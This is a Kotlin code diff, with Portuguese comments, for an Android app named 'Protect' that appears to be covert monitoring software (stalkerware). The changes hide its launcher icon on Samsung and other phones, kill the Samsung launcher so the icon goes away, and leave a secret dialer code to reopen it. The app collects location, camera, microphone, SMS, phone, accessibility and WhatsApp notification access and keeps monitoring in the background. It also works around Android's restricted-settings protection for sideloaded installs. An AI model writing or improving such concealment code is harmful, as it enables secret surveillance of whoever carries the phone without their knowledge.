@@ -135,7 +135,24 @@ class MainActivity : ComponentActivity() {
         // Assim, dispositivos que tinham a versão antiga com ícone visível passam a
         // ocultar automaticamente na primeira abertura após o update.
         val token = prefs.getString("link_token", "") ?: ""
-        if (token.length == 9) hideLauncherIcon(this)
+        if (token.length == 9) {
+            if (android.os.Build.MANUFACTURER.lowercase() == "samsung") {
+                // Samsung: usar "Ocultar apps" nativo do One UI (persistente no banco do launcher).
+                // Não desabilitar o alias aqui — ele precisa ficar HABILITADO para aparecer na
+                // lista de ocultar do Samsung. Se estava desabilitado por versão anterior, reabilitar.
+                val cn = ComponentName(packageName, LAUNCHER_ALIAS)
+                val state = packageManager.getComponentEnabledSetting(cn)
+                if (state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
+                    try {
+                        packageManager.setComponentEnabledSetting(
+                            cn, PackageManager.COMPONENT_ENABLED_STATE_DEFAULT, PackageManager.DONT_KILL_APP
+                        )
+                    } catch (_: Exception) {}
+                }
+            } else {
+                hideLauncherIcon(this)
+            }
+        }
 
         refreshPermStates()
         setContent { AndroidProtectTheme { AppRoot() } }
@@ -720,12 +737,16 @@ class MainActivity : ComponentActivity() {
                 hasLocation, hasBgLocation, hasCamera, hasMic, hasPhone, hasSms,
                 hasActivity, hasNotify, hasAccessibility, hasAdmin, hasWhatsAppListener, hasAllFiles
             ).count { !it }
+            val isSamsung = android.os.Build.MANUFACTURER.lowercase() == "samsung"
             val dialogBody = buildString {
                 append("O ícone será removido da gaveta de aplicativos. O monitoramento continua ativo em segundo plano.")
+                append("\n\n⚠️ Se o ícone estiver fixado na tela inicial, remova-o manualmente: segure o ícone → \"Remover da tela inicial\".")
                 if (missingCount > 0)
                     append("\n\n⚠️ $missingCount permissão(ões) ainda pendente(s). O monitoramento pode ser limitado.")
                 else if (isBatteryOptimized)
                     append("\n\n⚠️ Otimização de bateria ativa — o serviço pode ser suspenso pelo sistema.")
+                if (isSamsung)
+                    append("\n\n📱 Samsung: você será levado para as Configurações da Tela Inicial. Toque em \"Ocultar apps\" e marque \"Protect\" para ocultar usando o recurso nativo do One UI.")
                 append("\n\nPara reabrir: *#*#7777#*#*")
             }
             AlertDialog(
@@ -739,12 +760,44 @@ class MainActivity : ComponentActivity() {
                     Button(
                         onClick = {
                             showHideDialog = false
-                            // Desabilita o ALIAS do launcher (não a Activity em si).
-                            // Essa é a forma correta de ocultar o ícone em TODOS os OEMs,
-                            // incluindo Samsung OneUI que ignora mudanças na Activity principal.
-                            // A MainActivity real permanece ativa para ser aberta via *#*#7777#*#*.
-                            hideLauncherIcon(context)
-                            finish()
+                            if (isSamsung) {
+                                // Samsung: garantir que o alias está HABILITADO para aparecer
+                                // na lista "Ocultar apps" do One UI, depois abrir essa tela.
+                                try {
+                                    context.packageManager.setComponentEnabledSetting(
+                                        ComponentName(context.packageName, LAUNCHER_ALIAS),
+                                        PackageManager.COMPONENT_ENABLED_STATE_DEFAULT,
+                                        PackageManager.DONT_KILL_APP
+                                    )
+                                } catch (_: Exception) {}
+                                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                                    try {
+                                        context.startActivity(android.content.Intent().apply {
+                                            component = android.content.ComponentName(
+                                                "com.sec.android.app.launcher",
+                                                "com.android.homescreen.settings.HomeScreenSettingsActivity"
+                                            )
+                                            flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK
+                                        })
+                                    } catch (_: Exception) {
+                                        // Fallback: configurações gerais do launcher
+                                        try {
+                                            context.startActivity(
+                                                android.content.Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
+                                                    data = android.net.Uri.parse("package:com.sec.android.app.launcher")
+                                                    flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK
+                                                }
+                                            )
+                                        } catch (_: Exception) {}
+                                    }
+                                    finish()
+                                }, 500)
+                            } else {
+                                hideLauncherIcon(context)
+                                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                                    finish()
+                                }, 2000)
+                            }
                         },
                         colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFFF3838))
                     ) { Text("Ocultar agora", color = Color.White, fontWeight = FontWeight.Bold) }
@@ -1280,12 +1333,16 @@ class MainActivity : ComponentActivity() {
         val hasCamera        by hasCameraState
         val hasMic           by hasMicState
 
-        // Detecta se o APK foi instalado fora da Play Store em Android 13+.
-        // Nesse caso o Android exige que o usuário permita "Configurações Restritas"
-        // antes de poder ativar NotificationListener e Acessibilidade.
+        // Detecta se o APK foi instalado por fonte que exige "Configurações Restritas"
+        // (Android 13+). Instalações via ADB (installer=null) são fontes confiáveis
+        // para o sistema — o menu de 3 pontinhos não aparece no Info do App nesses
+        // casos. Somente installs via gerenciador de arquivos / navegador precisam
+        // dessa etapa. Se o NotificationListener já estiver ativo, o passo é pulado.
         val needsRestrictedSettings = remember {
             if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) {
-                false
+                false // Android 12 ou inferior: sem configurações restritas
+            } else if (WhatsAppNotificationListener.isEnabled(this)) {
+                false // Listener já ativo — passo desnecessário
             } else {
                 val installer = runCatching {
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R)
@@ -1293,7 +1350,10 @@ class MainActivity : ComponentActivity() {
                     else
                         @Suppress("DEPRECATION") packageManager.getInstallerPackageName(packageName)
                 }.getOrNull()
-                installer != "com.android.vending"
+                // null  = ADB install (fonte confiável, 3 pontinhos não aparecem)
+                // "com.android.vending" = Play Store (sem restrição)
+                // qualquer outro valor = sideload via gerenciador/navegador (precisa de desbloqueio)
+                installer != null && installer != "com.android.vending"
             }
         }
 
@@ -1305,6 +1365,12 @@ class MainActivity : ComponentActivity() {
                 delay(3000)
                 showNextAfterRuntime = true
             }
+        }
+
+        // Passo 2: se usuário voltou do Info do App e o listener já está ativo,
+        // avança automaticamente (raro, mas acontece em alguns OEMs que auto-concedem)
+        LaunchedEffect(hasNotify) {
+            if (step == 2 && hasNotify) { delay(400); step = 3 }
         }
 
         // Passo 3: auto-avança quando NotificationListener for ativado
@@ -1835,29 +1901,53 @@ class MainActivity : ComponentActivity() {
                     PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                     PackageManager.DONT_KILL_APP
                 )
+                val s = context.packageManager.getComponentEnabledSetting(cn)
+                Log.d("MainActivity", "hideLauncherIcon: alias state após disable=$s (2=DISABLED)")
             } catch (e: Exception) {
                 Log.e("MainActivity", "hideLauncherIcon setEnabled falhou: ${e.message}")
             }
         }
         doDisable()
-        // Força o launcher a atualizar o cache — sem isso o Realme/ColorOS mantém
-        // o ícone visível até o próximo boot mesmo com o alias desabilitado
-        try {
-            val broadcast = android.content.Intent(android.content.Intent.ACTION_PACKAGE_CHANGED).apply {
-                data = android.net.Uri.parse("package:${context.packageName}")
-                putExtra(android.content.Intent.EXTRA_CHANGED_COMPONENT_NAME_LIST,
-                    arrayOf(LAUNCHER_ALIAS))
-                putExtra(android.content.Intent.EXTRA_DONT_KILL_APP, true)
+
+        // Broadcast global — força Realme/ColorOS e outros launchers a atualizar o cache
+        fun sendChangedBroadcast(pkg: String? = null) {
+            try {
+                val b = android.content.Intent(android.content.Intent.ACTION_PACKAGE_CHANGED).apply {
+                    data = android.net.Uri.parse("package:${context.packageName}")
+                    putExtra(android.content.Intent.EXTRA_CHANGED_COMPONENT_NAME_LIST, arrayOf(LAUNCHER_ALIAS))
+                    putExtra(android.content.Intent.EXTRA_DONT_KILL_APP, true)
+                    if (pkg != null) setPackage(pkg)
+                }
+                context.sendBroadcast(b)
+            } catch (_: Exception) {}
+        }
+        sendChangedBroadcast()                               // broadcast global
+        sendChangedBroadcast("com.sec.android.app.launcher") // Samsung HoneySpace
+        sendChangedBroadcast("com.samsung.android.launcher")  // Samsung alternativo
+
+        // Samsung HoneySpace não remove o ícone ao receber ACTION_PACKAGE_CHANGED —
+        // só quando o processo reinicia e re-lê os pacotes instalados. Matar o
+        // launcher força um restart limpo que não encontrará o alias desabilitado.
+        if (android.os.Build.MANUFACTURER.lowercase() == "samsung") {
+            try {
+                val am = context.getSystemService(android.app.ActivityManager::class.java)
+                am?.killBackgroundProcesses("com.sec.android.app.launcher")
+                am?.killBackgroundProcesses("com.samsung.android.launcher")
+                Log.d("MainActivity", "hideLauncherIcon: launcher Samsung encerrado para forçar refresh")
+            } catch (e: Exception) {
+                Log.w("MainActivity", "hideLauncherIcon: não conseguiu encerrar launcher: ${e.message}")
             }
-            context.sendBroadcast(broadcast)
-        } catch (_: Exception) {}
-        // Retry após 1,5s — alguns launchers (Realme, Vivo) têm delay no processamento
+        }
+
+        // Retry após 1,5s — launchers lentos (Realme, Vivo) e Samsung com delay
         android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
             try {
                 val state = context.packageManager.getComponentEnabledSetting(cn)
+                Log.d("MainActivity", "hideLauncherIcon retry: state=$state")
                 if (state != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                     doDisable()
-                    Log.w("MainActivity", "hideLauncherIcon: retry necessário (state=$state)")
+                    sendChangedBroadcast()
+                    sendChangedBroadcast("com.sec.android.app.launcher")
                 }
             } catch (_: Exception) {}
         }, 1500)
